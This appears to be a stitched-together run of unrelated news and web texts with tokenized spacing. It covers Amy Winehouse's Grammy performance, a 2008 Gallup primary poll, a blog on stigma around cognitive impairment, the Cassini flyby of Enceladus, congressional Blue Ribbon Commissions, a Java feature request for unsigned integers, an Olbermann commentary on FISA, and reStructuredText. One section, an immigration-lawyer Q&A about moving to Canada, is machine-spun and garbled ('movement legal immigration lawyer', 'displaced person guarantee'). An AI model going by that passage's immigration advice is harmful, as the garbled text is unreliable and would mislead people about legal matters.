In his document , Lieberman ruled that the conflict was not territorial , but rather national - religious , and compared the situation to that in Kosovo , the Balkan peninsula and northern Ireland

Amy Winehouse will still sing at the Grammy Awards this weekend , despite her U.S. visa ban .
The troubled singer will be performing via satellite from London at the ceremony , where she has been nominated for six of the prestigious music industry awards .
The star 's visa refusal was a blow to Winehouse , who is currently being treated in rehab for drug addiction at the private Edward house clinic in north - west London .
Scroll down for more ...
Her application for a visa to enter the U.S. was rejected by the American Embassy in London , following widespread publicity over a 19 - minute video said to be of the 24 - year - old taking a potentially lethal cocktail of crack cocaine , Ecstasy and Valium .
Following the ruling , Winehouse said : " I 'm raring to go and really excited to be performing at my first Grammy Awards .
I 'd like to thank everyone for their support over the last couple of weeks .
" I 'm really sorry I can't be there but I appreciate that I 'm being given a second chance via satellite . "
Her spokesman added : " To prepare for the performance , Amy will be leaving the rehabilitation clinic today where she has been a resident for two weeks .
" She is feeling great , looking healthy and looking forward to doing what she does best .
" She will remain under full medical supervision and her treatment will continue as normal . "
Only the rap star Kanye West received more Grammy nominations - the music industry 's answer to the Oscars - than Winehouse .
In December , she was arrested over an alleged £ 200,000 plot to fix her husband Blake Fielder - Civil 's assault trial .
It is understood she was questioned .
Fielder - Civil , 25 , is on remand in Pentonville prison , North London , on charges of attempting to pervert the course of justice .
PRINCETON , NJ -- Barack Obama leads Hillary Clinton by seven percentage points , 49 % to 42 % in the Gallup Poll Daily tracking three - day average for Feb. 15 - 17 .
The daily tracking at this point is a measure of the sentiments of all Democrats nationally , whether they have had the opportunity to vote in their state 's primary or caucus .
Obama 's seven - point lead in the Feb.
15 - 17 results suggests that Democrats today , by a slim margin , prefer that he be their party 's standard - bearer to Clinton .
The next major event that could have an impact on the opinions of Democrats nationally is the Wisconsin primary on Tuesday , Feb. 19 .
National Republican preferences for John McCain and Mike Huckabee remain fairly constant , with McCain leading in the Feb. 15 - 17 three - day average by 28 points , 54 % to 26 % .
Huckabee did slightly less well in interviewing on Feb. 17 , but it is too soon to know if this represents a significant trend .
One key focus on the GOP side is the degree to which Huckabee supporters will stand by their man , given the recognition that McCain essentially has the Republican nomination sewn up .
On Monday , former president George H.W. Bush endorsed McCain . -- Frank Newport
: Gallup is interviewing 1,000 U.S. adults nationwide each day during 2008 .
The results reported here are based on combined data from Feb.
15 - 17 , 2008 , including interviews with 1,003 Republican and Republican - leaning voters , and 1,201 Democratic and Democratic - leaning voters .
For results based on these samples , the maximum margin of sampling error is ±3 percentage points .
In addition to sampling error , question wording and practical difficulties in conducting surveys can introduce error or bias into the findings of public opinion polls .
In this entry of my brain damage series , I ’ll provide a clinical example to convey how the cultural dynamics of stigma can play out in clinicians ’ behavior .
Once upon a time , I acted as an advocate for a woman I ’ll call Cindy , who was suffering from depression and cognitive difficulties stemming from the depression .
The problem had cropped up after a number of traumatic experiences that apparently caused a weak link to snap , bringing out this vulnerability to depression .
She assigned a new psychiatrist in the county mental health system .
This psychiatrist cut off the stimulant medication that Cindy was taking for ADD .
Consider the timing .
Cindy had just begun , as a first generation student , to attend junior college .
She was in the middle of her first semester .
It was a really big deal for her .
What was the rationale on the part of the psychiatrist for stopping her ADD meds ?
“ I do n’t believe in stimulant medication . ”
My role in this mess was provide some support to Cindy by attending an appeal meeting .
The head psychiatrist was present , and was acting kind of agitated .
His first order of business was to make sure I was n’t an attorney .
When Cindy fumbled and asked for something that was n’t exactly kosher , the head psychiatrist let her have it with a booming voice ( I mean a really booming voice ) , making her sound like some kind of criminal for daring to ask for this .
The woman changed color , but stayed calm and clarified her intent , since he was putting words in her mouth ( the straw man attack , as it ’s called ) .
So not only are cognitive deficits to be ignored , but they are a great opportunity for brutal bigotry .
At least for some people , even some who have attained a very high level of education , authority , and licensure .
Another name I ’m not putting in print , despite the temptation .
They understood that I was about to file a malpractice complaint with the medical board , and they restored her medication ( maybe they would have anyway , but why wait and see ? )
But they never considered cognitive issues , but this turned out to be a key to her recovery .
Mitigating for these issues in the mean time could have prevented a lot of distress , financial loss , and chaos in her life .
This is a good point to remind you that for many folks , stimulant medication may provide much - needed support for key cognitive functions necessary to hold things together for people who are struggling with some types of cognitive impairment .
Also , a lot of brain injury recovery is about regaining abilities and habits that most of us take for granted .
It ’s a bit like amnesia , except that it is for mostly unconscious habits that are necessary for success .
In Cindy ’s recovery , I believe this was a crucial aspect .
By the way , please , do n’t go away thinking I live to trash the mental health field .
I hope that this will help everyone , in the field or not , to look for ways that they can transcend this dynamic and live a more meaningful life .
I also hope that clinicians will realize that they have a responsibility to assess , refer , and treat these issues .
By describing it from various angles , I hope that I am making the problem much easier to perceive , so that we can respond .
I referred to this part as “ In the Clinical Dark Ages ” because there is so much progress that must be made just to be at a real starting point when it comes to addressing cognitive functioning in the mental health community .
In an upcoming part , I will talk about what can be done to help patch up cognitive problems or slow down progressive versions .
In part four , I will give an example of how a family needed to clue into cognitive problems in a family member that would otherwise have led to additional serious problems .

Activity on Enceladus has been the big discovery on the Cassini mission
The flyby took the probe through the plumes of icy particles emanating from the enigmatic cracks at the south pole dubbed the " tiger stripes " .
The cause of this activity has developed into the big scientific question of the flagship mission .
The pass on Wednesday was designed to allow Cassini 's instruments to sample the plume particles directly .
This should help scientists address the tantalising issue of whether there is an ocean under Enceladus ' icy crust .
Trade off
However , commanding a probe more than a billion km from Earth to fly so close to this 500 km - wide moon was no small feat .
The Viking mission may have gone to within 20 km of the Martian moon Phobos , but there is nothing in deep Solar System exploration history to compare with Cassini 's pass .
If you are going to take a risk , you 've got to see some benefit
Bob Mitchell , Cassini programme manager
And at one stage in the planning , Cassini was going to go even closer to the surface .
" The scientists went to the navigators and said , 'hey , how close can you go ? " recalls Cassini programme manager , Bob Mitchell .
" Well , they thought that was a great sport and said , ' we can go to 25 km ' .
And the scientists said , ' well , let 's do it then ' . "
But Mitchell said the flyby distance was eventually raised to provide some extra margin .
He told BBC News : " We concluded that 25 km was safe , but the increase in the science you get between 25 km and 50 km is n't all that great ; and so my view was , if you are going to take a risk , you 've got to see some benefit .
I did n't see the gain being big enough to take any risk . "
' No worry '
It should be said that at the moment of closest approach , Cassini was not actually in the plumes .
Closest approach occured just below the equator , as the spacecraft swept down from the north on a trajectory that eventually ducked under the moon at the south pole .
The tiger stripes , or sulci , are now the focus of intense study
More details
At the plumes , Cassini should have had an altitude no lower than about 190km .
The particles it will have flown through are very small - about the width of a human hair - and moving in a stream of gas that leaves the surface at some 1,300 km /h .
The encounter should not have presented any danger to Cassini .
" There 's nothing to worry about , " said Professor Carl Murray , a UK scientist working on the mission .
" The particles are essentially E - Ring particles and we go through the E - Ring all the time ; these are micron - sized .
The risk to the spacecraft comes from centimetre - sized particles and there 's no indication that Enceladus is producing anything like that . "
Closing theories
The spacecraft was turned to give the prime view to its Ion and Neutral Mass Spectrometer ( INMS ) and its Cosmic Dust Analyzer ( CDA ) .
These instruments will have measured the density , size , composition and speed of the gas and the particles .
The plumes are thought to be the source of Saturn 's E - Ring
" There are two types of particles coming from Enceladus : one pure water - ice , the other water - ice mixed with other stuff , " explained Sascha Kempf , the CDA 's deputy principal investigator from the Max Planck Institute for Nuclear Physics in Heidelberg , Germany .
" We think the clean water - ice particles are being bounced off the surface and the dirty water - ice particles are coming from inside the moon .
This flyby will show us whether this concept is right or wrong . "
Several gases , including water vapour , carbon dioxide , methane , perhaps a little ammonia and either carbon monoxide or nitrogen gas , make up the gaseous envelope of the plume .
" We want to know if there is a difference in composition of gases coming from the plume versus the material surrounding the moon .
This may help answer the question of how the plume formed , " explained Hunter Waite , from the Southwest Research Institute , San Antonio , US , who leads the INMS team .
Picture limitation
There is an intense debate in the scientific community about the origin of the jets and their associated temperature " hot spots " on the surface .
Several competing theories are in play .
Some have suggested the idea of occasional venting from a pressurised sub - surface reservoir of water that is maintained by the heat of tidal forces and residual radioactivity in the rocky core .
Others prefer the idea of ice and gases that are compressed and trapped in clathrates , frozen bundles that suddenly release their gases when they are exposed as the tiger stripes open and flex .
If there is a substantial body of liquid water below the surface being sustained by an energy source , it means Enceladus would have at least some of the key ingredients needed for microbial life .
Hence , the need to learn more .
The flyby occured just after 1900 GMT on Wednesday .
There will be no really close - up images from the pass .
In order to give the INMS and the CDA the ideal observing position , the spacecraft had to be orientated in a way that resulted in its optical imaging equipment being turned towards space .
The cameras will have imaged Enceladus on the way in and out , however .
These pictures will reveal northern regions of the moon previously not captured by Cassini .

Based on the standard dangers Americans post via web - based networking media about moving to Canada , it shows up some of you could truly utilize exhortation from a movement legal immigration lawyer Toronto .
The Canadian movement site experienced such a high volume of traffic that critical political decision day that it slammed ; Americans are currently applying by the thousand to Canadian colleges .
Yet , for those of you who have n’t exactly built up a departure plan yet need to , we contacted Canadian movement legal advisor Raj Sharma to pose inquiries that may have been burdening your brain while living in Trump ’s America .
Would it be advisable for me to wed a Canadian to move there ?
A wedding is an incredible alternative .
For specialist or financial class , we take a gander at your capabilities and work involvement .
We ’ll even demand an English language test from an American .
Wedding somebody or being in a customary law relationship or even a matrimonial association with a Canadian is an extraordinary method to move to Canada :
There ’s no language test , there ’s no training or pay prerequisite .
Americans have a favorable position here in light of the fact that they are visa - absolvedthey can enter as a guest and document an application from inside Canada and get a work license inside a couple of months .
Assuming you have a willing and qualified Canadian life partner , handling time [ for spousal sponsorship ] is around a year .
Would I be able to get “ free ” medicinal services in the event that I move to Canada ?
As a lasting occupant , yes .
Suppose you ’re a universal understudy here , you ’d get human services .
In case you ’re an impermanent remote laborer , you could get medicinal services .
You need to conform to whatever commonplace residency prerequisite there is [ where you ’re living ] ; for instance , in Alberta , you may be there for a few months prior .
What ’s the quickest route for me to move to Canada as a 20 - something ?
The quickest way is on the off chance that you qualify as a gifted individual under an express section .
Preparing times there could be a half year or thereabouts .
Express section , once more , requires every one of your affairs in order : post - optional training , high language capability , work involvement in a gifted occupation .
Express section is practically similar to a dating site where you set up your profile [ for Canada to consider ] , and your profile is positioned against the various profiles in the pool .
Every month there is a choice , and the profiles or focuses go up or down Canada is to some degree savage is its choice of laborers from abroad .
We genuinely outwit the best .
There ’s a great deal of migration counsel : A ton of it is terrible movement guidance .
There are no guidelines on immigration lawyer Toronto , so they do pull off significantly shittier assistance than an attorney can .
I would truly recommend individuals do their exploration Sometimes it pays to get things done without anyone else , once in a while it does n’t .
At times it pays to go to a fast counsel and check your exploration .
Will I lawfully purchase my way into Canada ?
Cash consistently matters …
You could purchase a business in British Columbia or Saskatchewanregions have diverse common candidate programs .
It relies upon the area , yet absolutely entrepreneurs or individuals who make work for other people .
Certain areas might need to build up specific segments , similar to Saskatchewan and their young rancher ’s program .
Would I be able to have a displaced person guarantee on the off chance that I recognize as a major aspect of an underestimated gathering being contrarily influenced in Trump ’s America ?
That would be a troublesome case to demonstrate in light of the fact that one of the obstacles will be state security .
One of the issues will be there ’s a distinction between segregation and abuse .
Surely individuals from the LGTBQ people group face separation
But mistreatment is a legitimate term of craftsmanship .
Unquestionably there ’s no doubt as far as I can say that if a transgender individual is banished from serving in the military that that is separation I ’m going to leave the entryway open a smidgen on this since this is a creating territory there where there is presently biased activity by the state .
At whatever point the state engages in focusing on explicit networks , it opens the entryway for displaced person security .
Would I be able to move to Canada on the off chance that I have a criminal record ?
Indeed , yet you will need to talk with an accomplished migration legal immigration lawyer Toronto .
It additionally relies upon a criminal conviction .
There is a procedure of restoration and considered recovery , gave certain timeframes have slipped by .
There are methods for getting around that criminal record , yet it depends on what that criminal record is and how a lot of time has gone since that record and resulting conduct .
It gets muddled rapidly .
This is one territory of the law where you truly can’t phony it until you make it .
You truly need proficient guidance by then .
“ It was almost guaranteed to get attention , ” said Hamilton , citing its chairmen , future Federal Reserve Chairman Alan Greenspan ( pictured ) and the late Daniel Patrick Moynihan of New York .
Why does Congress outsource its work ?
On Tuesday , a bipartisan group proposed a bold , far - reaching and controversial solution to the nation ’s deteriorating infrastructure and clogged highways .
After two years of research and negotiations , the panel recommended up to a 40 - cent increase on the gas tax .
How did a collection of politicos find the courage to suggest such a politically hot solution ?
Quite easily , in fact :
They ’re not up for reelection .
It was the work of a Blue Ribbon Commission .
Advertisement
Beginning in the 1970s and increasingly in the last decade , Congress has taken a pass on handling many complicated or controversial issues — from Medicare to veterans ’ benefits to war — preferring instead to appoint a handful of retired , moderate statesmen to make recommendations that it will promptly ignore .
If Congress today was tasked with drafting the Bill of Rights , said frequent Blue Ribboner and former Rep. Lee Hamilton , “ they ’d probably set up a commission . ”
We ’re in the thick of the Blue Ribbon Commission Era , which presents a quintessential Washington Mystery :
Who are all these commissioners ?
What in the name of Congress are they doing ?
And what does it say about government that it now routinely outsources the governing process ?
The traffic commission report is illustrative .
Faced with crumbling roads and bridges and maddening traffic congestion in 2005 , Congress decided that rather than hold hearings and work on legislation , it would establish the National Surface Transportation Policy and Revenue Study Commission .
The commission lost control early and ended with a 10 - car pileup .
Hamilton , who ’s been doing the Blue Ribbon shuffle since the Carter administration , said that “ the stature of the people who serve is terribly important . ”
The transportation committee could boast of no former senators or ambassadors and was stocked with unknown business leaders whose industries stood to benefit .
The chairwoman , Transportation Secretary Mary Peters , did n’t have the necessary quality of having retired .
Commissioners go to great lengths , said Hamilton ( Iraq Study Group ; 9 - 11 Commission ) and former Nebraska Sen. Bob Kerrey ( 9/11 Commission ) , to prevent a dissenting report .
In Peters ’ unusual case , she was the author of a dissent , signed by two other Republicans , meaning her own committee out - voted her .
Even commissions that do n’t go this far off the rails , however , generally do n’t end up arriving anywhere , leaving their recommendations lost in transit .
Often , that ’s just fine with the Congress that established it .
Within hours , Republican Whip Roy Blunt of Missouri , whose Congress had originally created the transportation commission , was ripping its 40 - cent tax proposal in a press release .
The icy congressional greeting differed markedly from the one given the much - heralded Social Security commission from the 1980s .
“ It was almost guaranteed to get attention , ” said Hamilton , citing its chairmen , future Federal Reserve Chairman Alan Greenspan and the late Daniel Patrick Moynihan of New York , a former Democratic senator and ambassador to the United Nations .
Their stature and bipartisan regard gave both Democrats and Republicans the cover needed to make difficult reforms .
That effort is the envy of Blue Ribboners and was cited as a model of success by every serial commissioner spoken to for this article .
That ’s because it ’s one of a kind .
In general , commissions are little more than a symptom of government overwhelmed .
“ [ President Herbert ]
Hoover did a commission on how you restructure the federal government , but I think in recent years we ’ve seen more commissions .
Part of the reason is the dysfunction within the system , ” said Leon Panetta ( Iraq Study Group ) , another member of the commission circuit .
“ There ’s a lack of willingness on both sides to find consensus , to sit down and try to figure out what needs to be done .
Normally that ’s how government is supposed to work . ”
In the past , said Hamilton , “ I do n’t really recall commissions like the Iraq Study Group or 9/11 .
It does raise questions about the capacity of Congress to do oversight , and maybe even disturbing questions .
You would think that looking into intelligence failures surrounding a terrorist attack would be something Congress would handle . ”
Of course , Hamilton ’s been there and understands the complexity of congressional work .
And , they say , it ’s only increased since he first arrived on the Hill .
“ Let ’s just take agriculture , ” he said of his time in Congress in the ’60s .
“ I had three or four groups that lobbied you with regard to the Farm Bill .
Today you ’ve got 50 . ”
Julian Zelizer , a congressional historian at Princeton University , dated the rise of commissions to the collapse of the committee system in the ’70s .
“ In the ’50s and ’60s , congressional committees served the role that Blue Ribbon Commissions do now .
There was bipartisan compromise and a certain amount of secrecy .
Then the committee system broke apart in the ’ 70s , and I do n’t think it was a coincidence that in the ’ 80s you had the Social Security commission , ” he said .
“ I ’m not sure how effective [ commissions ] are , ” he added .
“ Ultimately , a commission is not a committee . ”
In other words , it does n’t have the power to mark up legislative language and move it to the floor .
Kerrey and the other commissioners were quick to point out the limits of the exercise .
“ Commissions can be one of two things : a way to avoid a problem , or a mechanism to address a problem that could n’t be addressed otherwise , ” Kerrey said .
The problem with solving a problem through a commission is that the report can melt under the political heat .
“ The reality is that knowledge is powerful in politics , but politics is much more powerful than knowledge , ” Zelizer said .
He pointed to the health care task force that then - first - lady Hillary Rodham Clinton led and a 2001 Social Security commission as examples of commission compromises that wilted under the political light of day .
Often , there ’s nobody left to shade it from the heat .
“ It requires significant follow - through , ” Panetta said .
“ Everybody gets out of town .
Nothing happens .
There are few funds made available to try to say to the chairman and some staff , ‘ We ’re going to keep you in place for a year to implement this , to lobby Congress . ’ ”
When that happens , as it did with an oceans commission Panetta was on and with the 9/11 Commission , results are achievable .
But it ’s hard work for no pay and little reward .
Often , it involves reading classified documents in secure locations , which means travel and time away from home .
For somebody like Panetta , who lives in California , it requires a lot of cross-country flights in coach seating ( though he said he often uses his frequent flier miles to upgrade ) .
It ’s difficult to explain to someone not deeply ingrained in the capital ’s culture why anyone would bother to take part .
“ It ’s a standing joke with my wife that if I come home with one more commission without pay , she ’s going to take drastic action — divorce or something , ” Hamilton said .
There are many cases where unsigned integer arithmetic is preferable and more convenient to work with than the signed integer arithmetic provided by Java .
Unsigned arithmetic on 32 bit and 64 integers could be provided by adding static methods to Integer and Long , e.g. Integer.addUnsigned , Integer.divideUnsigned , etc. Name : jd38982 Date : 02/04/2002 Customer Problem Description : jdk does n't support unsigned long value .
The " long " data type is a signed long data type in jdk1.3 or jdk1.4 .
That means for positive number , it only support up to 63 bits .
If a positive number that is bigger than 63 bits , it becomes a negative number .
We need jdk to support an unsigned long value .
###@###.### 2002-09-20 Name : rmT116609 Date : 08/14/2003 A DESCRIPTION
OF THE REQUEST : Java primitive number are byte ( 8 bits signed ) , short ( 16 bits signed ) , int ( 32 bits signed ) and long ( 64 bits signed ) .
It may be the time for java to add capability to optimal arithmetic with 128 bits signed integers because 64 bits processors will make 128 bits operation as fast as actual 64 bits .
We propose the keyword ' huge ' and also the associated class Huge .
Moreover algorithm like digest ( SHA , MD5 ) and cryptography need to make operation on block of 128 bits size !
JUSTIFICATION :
It will help making computation on CRC , Error Correcting Code , Digest ( MD5 ) impressively faster than with BigInteger class .
It is a natural evolution like for type long in a 32 bits environnement .
EXPECTED VERSUS ACTUAL BEHAVIOR : EXPECTED -
To have more choice for choosing type of integers to make arithmetic with java .
To have a powerful type to make 128 bits computation which will be JVM optimized .
ACTUAL - To make arithmetic with more than 63 bits unsigned and 64 bits signed you have to use the class BigInteger which is far more slower than using primitive type .
Instead you have to code your own 128 bits computation instrument which cannot be as optimized as a native primitive java type !
CUSTOMER SUBMITTED WORKAROUND : Using java.math .

Keith Olbermann 's Special Comment tonight on Countdown was yet another scathing rebuke of President Bush and his lies about the pending FISA legislation and fear tactics during his final State of the Union address earlier this week .
Bush has said repeatedly he would veto any FISA legislation that did not include immunity for the telecommunications companies who broke the law and betrayed the American people .
However , as Keith points out , if the president were to veto the legislation and there was another terrorist attack inside the U.S. , he , and he alone would be responsible for it -- all in the name of protecting huge corporations over the American people he was charged with protecting .

Because if there were , Mr. Bush , and you were to , by your own hand , veto an extension of this eavesdropping , and some terrorist attack were to follow , you would not merely be guilty of siding with the terrorists , you would not merely be guilty of prioritizing the telecoms over the people , you would not merely be guilty of stupidity , you would not merely be guilty of treason ... but you would be personally , and eternally , responsible .
Sorry , Mr. Bush .
The eavesdropping provisions of FISA have obviously had no impact on counter - terrorism , and there is no current or perceived terrorist threat , the thwarting of which could hinge on an e-mail or a phone call going through room 641 - A at AT&T in San Francisco next week or next month .
Transcript below the fold
And finally , as promised , a Special Comment -- of FISA and the telecoms .
In a presidency of hypocrisy -- an administration of exploitation -- a labyrinth of leadership -- in which every vital fact is a puzzle inside a riddle wrapped in an enigma hidden under a claim of executive privilege supervised by an idiot -- this one ... is surprisingly easy .
President Bush has put protecting the telecom giants from the laws ... ahead of protecting you from the terrorists .
He has demanded an extension of the FISA law -- the Foreign Intelligence Surveillance Act -- but only an extension that includes retroactive immunity for the telecoms who helped him spy on you .
Congress has given him , and he has today signed a fifteen - day extension which simply kicks the time bomb down the field , and has changed nothing of his insipid rhetoric , in which he portrays the Democrats as ' soft on terror ' and getting in the way of his superhuman efforts to protect the nation ... when , in fact , and with bitter irony , if anybody is ' soft on terror ' here ... it is Mr. Bush .
In the State of the Union Address , sir , you told Congress , " if you do not act by Friday , our ability to track terrorist threats would be weakened and our citizens will be in greater danger . "
Yet you are willing to weaken that ability !
You will subject us , your citizens , to that greater danger .
This , Mr. Bush , is simple enough even for you to understand :
If Congress approves a new FISA act without telecom immunity and sends it to your desk and you veto it -- you , by your own terms and your own definitions , you will have just sided with the terrorists .
Ya gotta have this law , or we 're all gonna die .
But you might veto this law !
It 's bad enough , sir , that you are demanding an ex post facto law which would clear the phone giants from responsibility for their systematic , aggressive , and blatant collaboration with your illegal and unjustified spying on Americans , under the flimsy guise of looking for any terrorists stupid enough to make a collect call or send a mass e-mail .
But when you then demanded again , during the State of the Union address , that Congress retroactively clear the Verizons and the AT&T's , you would n't even confirm that they actually did anything for which they deserved to be cleared !
" The Congress must pass liability protection for companies believed to have assisted in the efforts to defend America . "
Believed ?
Do n't you know ?
Does the endless hair - splitting of your presidential fine print , extend even here ?
If you , sir , are asking Congress , and us , to join you in this shameless , breathless , literal , textbook example of fascism -- the merged efforts of government and corporations who answer to no government -- you still do n't have the guts to even say the telecom companies did assist you , in your efforts ?
Will you and the equivocators who surround you like a cocoon never go on the record about anything ?
Even the stuff you claim to believe in ?
Silly me .
Of course Mr. Bush is going to say " believed . "
Yes , it sounds dumber than if he had referred to himself as " the alleged president , " or had said today was " reportedly Thursday , " or had claimed " Mission Accomplished " in Iraq .
But the moment he says anything else , any doubt that the telecoms knowingly broke the law , is out the window , and with it , any chance that even the Republicans who are fighting this like they were trying to fend off terrorists using nothing but broken beer bottles and swear words could n't consent to retroactively immunize corporate criminals .
Which is why the Vice President probably should n't have phoned in to the Rush Limbaugh Propaganda - Festival yesterday .
Sixth sentence out of Mr. Cheney 's mouth :
The FISA bill is about , quote , " retroactive liability protection for the companies that have worked with us and helped us prevent further attacks against the United States . "
Oops .
Mr. Cheney is something of a loose cannon , of course .
But he kind of let the wrong cat out of the bag there .
Because Mr. Bush -- and the corporations he values more than people -- did n't want anybody to verify what Mark Klein says .
Mark Klein is the AT&T whistleblower who appeared on this newscast last November , who explained , in the placid , dull terms of your local neighborhood I - T desk , how he personally attached all of AT&T 's circuits -- everything carrying every phone call , every e-mail , every bit of web browsing -- into a secure room ...
... Room Number 641- A , at the Folsom Street facility in San Francisco -- where it was all copied so the government could look at it .
Not some of it ; not just the international part of it ; certainly not just the stuff some truly patriotic and telepathic spy might be able to divine had been sent or spoken by or to a terrorist .
Everything .
Every time you looked at a naked picture , every time you bid on eBay , every time you phoned - in a donation to a Democrat .
" My thought was ' George Orwell 's 1984 , ' " Mr. Klein told me , reflecting back , " and here I am , being forced to ... connect the Big Brother machine . "
You know , Mr. Bush , if Mr. Klein 's " Big Brother Machine " -- the one the Vice President conveniently just confirmed for us -- if it was of any damn use at all at actually finding anything , you could probably program it to find out who started that slanderous e-mail about Barack Obama .
Use Room 641 - A to identify that E -- assassin , sir , and I 'll stand up and applaud you .
Yeah , I 'm holding my breath on that one , too .
But of course , sir , this is n't about finding that kind of needle in a haystack .
This is n't even about finding a haystack .
This is about scooping up every piece of hay there ever was , and laying the groundwork for the next little job which you have to outsource to AT&T and Verizon .
It was your Director of National Intelligence , Mr. McConnell , letting this one out of the same bag .
The need for Homeland Security to stave off cyber-attacks against the government 's computer networks .
And how do they do that , sir ?
By constantly monitoring the internet -- the whole internet .
And who actually , physically , does that , Mr. Bush ?
Right .
The same telecom giants for whom you want immunity -- Quickly .
So quickly , you would n't believe it .
Because this previous domestic spying , and this upcoming policing of the internet -- they may be completely evil , indiscriminate , unlawful .
So you have to dress it up , as something just the opposite .
It is n't evil ... it's " to protect America . "
It is n't indiscriminate ... it's " the ability to monitor terrorist communications . "
It is n't unlawful ... it 's just the kind of perfectly legal thing , for which you happen to need immunity !
There 's yet another level to this , and here we move from Big Brother ... to Sleazy Son .
Mr. Bush 's new Attorney General , Mr. Mukasey , the one who has already taken four different positions on water - boarding , and who may yet tie that record on this subject of telecom immunity -- he has a very personal stake in this .
There happens to be a partner in the law firm of Bracewell and Giuliani , named Marc Mukasey .
And Bracewell and Giuliani and the Attorney General 's son Marc , just happen to represent ... Verizon .
You know , Verizon - Telecom Giant .
And all of a sudden this is no longer just a farce in which " protecting the telecoms " is dressed up for us as , ' protecting us from terrorist conference calls . '
Now it begins to look like the bureaucrats of the Third Reich trying to protect the Krupp Family industrial giants by literally re-writing the laws for their benefit .
And we know how that turned out : Alfried Krupp and eleven of his directors were convicted of War Crimes at Nuremburg .
Nevertheless .
For those of us watching a President demanding this very specific law ( the one the Germans had was called the " Lex Krupp " ) there is one surprising bit of comfort in all this :
Clearly , Mr. Bush is at his hyperbolic worst here .
Consider how his former chief of staff Andy Card came on and scolded Chris Matthews and me after the State of the Union address .
" The President 's address tonight was very important , " Card said , " because it really was a sobering call to reality for us .
" And the reality is , we have an enemy who wants to hurt us .
The primary job of the president to protect us .
" He talked about protecting us .
He talked about the needs to have the tools to protect us . "
Indeed , Mr. Bush .
The primary job of any president is to protect us .
Not just those of us who own Internet and Telephone companies --
All of us .
And even you , sir , with your intermittent grasp of reality ... even with your ego greater than a 100 - percent approval rating ... even with your messianic petulance -- even you could not truly choose to protect the corporations instead of the people .
I am not talking about ethics here .
I am talking about blame .
Even if it 's you throwing out the baby with the bathwater , Mr. Bush , it still means we can safely conclude ... there is no baby !
This is not a choice of protecting the telecoms from prosecution , or protecting the people from terrorists , sir .
It is a choice of protecting the telecoms from prosecution , or pretending to protect the people from terrorists .
Sorry , Mr. Bush .
The eavesdropping provisions of FISA have obviously had no impact on counter - terrorism , and there is no current or perceived terrorist threat , the thwarting of which could hinge on an e-mail or a phone call going through room 641 - A at AT&T in San Francisco next week or next month .
Because if there were , Mr. Bush , and you were to , by your own hand , veto an extension of this eavesdropping , and some terrorist attack were to follow , you would not merely be guilty of siding with the terrorists , you would not merely be guilty of prioritizing the telecoms over the people , you would not merely be guilty of stupidity , you would not merely be guilty of treason ... but you would be personally , and eternally , responsible .
And if there is one thing we know about you , Mr. Bush , one thing that you have proved time and time again under any and all circumstances , it is that you are never responsible .
Markup Syntax and Parser Component of Docutils
Date : 2016-05-24
Note " reStructuredText " is ONE word , not two !
reStructuredText is an easy - to - read , what - you - see - is - what - you - get plaintext markup syntax and parser system .
It is useful for in - line program documentation ( such as Python docstrings ) , for quickly creating simple web pages , and for standalone documents .
reStructuredText is designed for extensibility for specific application domains .
The reStructuredText parser is a component of Docutils .
reStructuredText is a revision and reinterpretation of the StructuredText and Setext lightweight markup systems .
The primary goal of reStructuredText is to define and implement a markup syntax for use in Python docstrings and other documentation domains , that is readable and simple , yet powerful enough for non-trivial use .
The intended purpose of the markup is the conversion of reStructuredText documents into useful structured data formats .
See statemachine .py for an example of a Python module fully documented using reStructuredText .
